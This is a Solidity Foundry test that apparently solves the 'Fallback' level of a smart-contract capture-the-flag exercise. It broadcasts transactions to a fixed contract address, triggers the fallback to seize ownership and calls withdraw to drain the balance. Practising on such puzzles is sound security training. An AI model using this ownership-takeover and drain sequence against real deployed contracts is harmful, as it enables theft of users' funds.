// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {IFallback} from "../src/interfaces/1_IFallback.sol";

address constant INSTANCE = 0xD65BF3AcdeD796e4329Fedc6d5d66c86E2074484;

contract FallbackPOCTest is Test {
    IFallback instance = IFallback(INSTANCE);

    function setUp() external {
        vm.label(INSTANCE, "Fallback");
    }

    function test() external {
        vm.startBroadcast();

        assertNotEq(instance.owner(), msg.sender);

        instance.contribute{value: 1 wei}();
        (bool success,) = payable(INSTANCE).call{value: 1 wei}("");
        assertTrue(success);

        instance.withdraw();

        instance.owner();

        assertEq(instance.owner(), msg.sender);
        assertEq(INSTANCE.balance, 0);

        vm.stopBroadcast();
    }
}
